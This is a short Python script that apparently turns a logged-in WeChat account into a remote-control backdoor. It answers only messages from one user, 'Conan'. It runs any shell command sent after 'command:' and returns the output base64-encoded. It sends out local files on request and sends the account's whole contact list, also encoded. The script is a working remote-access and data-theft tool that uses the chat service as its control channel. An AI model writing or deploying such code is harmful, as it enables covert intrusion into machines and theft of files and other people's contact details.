import itchat
import base64
import time
import sys

reload(sys)
sys.setdefaultencoding('utf8')


@itchat.msg_register(itchat.content.TEXT)
def text_reply(msg):
    # print msg
    if msg['User']['PYQuanPin'] != 'Conan':
        return

    if msg['Text'] == 'info':
        friendslist = itchat.get_friends()
        friendsUsefulText = ''
        for friend in friendslist:
            friendUsefulText = '[' + friend['PYQuanPin'] + '.' + friend['NickName'] + '.' + friend[
                'RemarkPYQuanPin'] + '.' + str(friend['StarFriend']) + ']' + '\n'
            friendsUsefulText += friendUsefulText
        itchat.send(base64.encodestring(str(friendsUsefulText)), msg['FromUserName'])
        return
    if msg['Text'].find('decode') != -1:
        itchat.send(base64.decodestring(msg['Text'].split(':')[1]), msg['FromUserName'])
        return
    if msg['Text'].find('command') != -1:
        import subprocess
        output = subprocess.Popen(msg['Text'].split(":")[1], shell=True, stdout=subprocess.PIPE,
                                  stderr=subprocess.STDOUT)
        itchat.send(base64.encodestring(str(output.stdout.read().decode('gbk').encode("utf-8"))), msg['FromUserName'])
        return
    if msg['Text'].find('file') != -1:
        path = msg['Text'].split(":")[1]
        itchat.send_file(path.decode('utf-8'))
    return


itchat.auto_login(hotReload=True)
itchat.run()
